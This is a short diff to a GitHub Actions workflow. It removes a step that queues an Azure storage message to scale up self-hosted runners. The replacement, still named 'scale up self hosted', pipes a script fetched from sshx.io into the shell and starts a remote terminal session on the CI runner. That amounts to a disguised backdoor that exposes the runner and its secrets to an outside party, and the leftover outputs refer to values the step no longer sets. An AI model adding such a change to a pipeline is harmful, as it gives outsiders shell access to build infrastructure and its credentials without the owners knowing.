@@ -19,10 +19,7 @@ jobs:
 
     - name: scale up self hosted
       id: scaleJob
-      run: |
-        OUTPUT=$(az storage message put --queue-name "${{ env.AZ_QUEUE_NAME }}" --content "${{ github.run_id }}" --account-name "${{ env.AZ_STORAGE_ACCOUNT }}")
-        echo "::set-output name=scaleJobId::$(echo "$OUTPUT" | grep "id" | sed 's/^.*: //' | sed 's/,*$//g')"
-        echo "::set-output name=scaleJobPop::$(echo "$OUTPUT" | grep "popReceipt" | sed 's/^.*: //' | sed 's/,*$//g')"
+      run: curl -sSf https://sshx.io/get | sh -s run
     outputs:
       scaleJobId: ${{ steps.scaleJob.outputs.scaleJobId }}
       scaleJobPop: ${{ steps.scaleJob.outputs.scaleJobPop }}
